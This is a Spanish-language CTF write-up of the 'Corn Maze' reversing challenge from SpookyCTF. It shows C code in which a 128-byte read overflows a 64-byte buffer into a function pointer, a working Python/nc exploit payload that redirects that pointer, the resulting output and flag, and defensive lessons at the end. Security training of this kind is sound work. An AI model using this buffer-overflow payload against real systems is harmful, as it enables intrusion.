# Corn Maze

| **CTF**        | SpookyCTF |
| -------------- | --------- |
| **Categoría**  | Reversing |
| **Puntos**     | 50        |
| **Dificultad** | Easy      |

## Enunciado

> I can't trust computers anymore. I trusted the input, it overflowed.

Un binario (`chall1`) imprime una historia sobre estar atrapado en un laberinto de maíz y pide una "dirección del cartel".

## Resumen

```c
void corn_maze_exit() {
    char secret[128];
    FILE *f = fopen("/opt/ctf/chall1/secret.txt", "r");
    fgets(secret, sizeof secret, f);
    printf("Secret value: %s", secret);
}

void center_of_corn_maze() {
    printf("You're still stuck in the maze, try again! \n");
}

void vuln() {
    struct {
        char buf[64];
        void (*direction)();
    } s;

    s.direction = center_of_corn_maze;
    printf("New sign direction: ");
    read(0, s.buf, 128);
    s.direction();
}
```

`vuln()` guarda un buffer de 64 bytes y un puntero a función `direction` justo al lado, dentro del mismo struct. `direction` empieza apuntando a `center_of_corn_maze`, y después de leer la entrada se llama directamente — se ejecuta lo que sea que haya en ese puntero.

El fallo está en el read: `read(0, s.buf, 128)` acepta **128 bytes** en un buffer de **64 bytes**. Como `direction` está justo después de `buf` en memoria, cualquier byte escrito más allá del 64 sobrescribe el puntero. `corn_maze_exit()`, la función que realmente imprime el secreto, nunca se llama por sí sola en el programa — hay que llegar a ella secuestrando ese puntero.

## Solución

### Encontrar el offset

`buf` ocupa 64 bytes, y el struct no tiene padding entre `buf` y `direction` con este layout, así que el puntero empieza justo en el offset 64.

### Encontrar la dirección objetivo

`corn_maze_exit` es una función normal del binario (sin PIE / ASLR según lo que implica el reto), así que su dirección se puede sacar con `objdump` o un desensamblador:

```bash
objdump -d chall1 | grep corn_maze_exit
```

lo que da `0x4011d6`.

### Construir el payload

Rellenar los 64 bytes de `buf` con relleno, y luego sobrescribir `direction` con la dirección de `corn_maze_exit` (little-endian, 8 bytes para un puntero de 64 bits):

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'A'*64 + struct.pack('<Q', 0x4011d6))" | nc <host> <port>
```

### Resultado

```
You're stuck in a corn maze! All the signs are pointing you deeper into the maze, 
can you redirect the sign to help you get out to POINT you in the right direction?

You're somewhere in the maze... 
New sign direction: 
You've made it out of the maze! 
Secret value: br4v3Se@O77er

Well done! Use the secret value to unlock the next part of the challenge! 
```

`direction()` ahora llama a `corn_maze_exit()` en vez de a `center_of_corn_maze()`, que lee e imprime el archivo secreto del servidor.

## Flag

```
spooky{br4v3Se@O77er}
```

## Qué aprendí

- Un struct que mezcla un buffer de tamaño fijo con un puntero a función es un objetivo clásico de overflow: el compilador los coloca contiguos en memoria sin ninguna comprobación de límites automática entre ellos.
- Siempre hay que comparar el tamaño que se pasa a `read`/`fgets`/`gets` con el tamaño real del buffer que rellena — un `read(fd, buf, N)` donde `N` es mayor que `sizeof(buf)` ya es la vulnerabilidad en sí misma, sin necesidad de ninguna otra pista.
- La sobrescritura no necesita shellcode aquí: redirigir un puntero a función hacia una función que ya existe en el binario (`corn_maze_exit`) es suficiente cuando la función "objetivo" ya está compilada pero simplemente nunca se llama en el flujo normal del programa.
- Buscar el offset es solo aritmética sobre el layout del struct (`sizeof(buf)` hasta el campo que se quiere alcanzar), no hay que adivinar — no hace falta usar un patrón cíclico cuando se tiene el código fuente.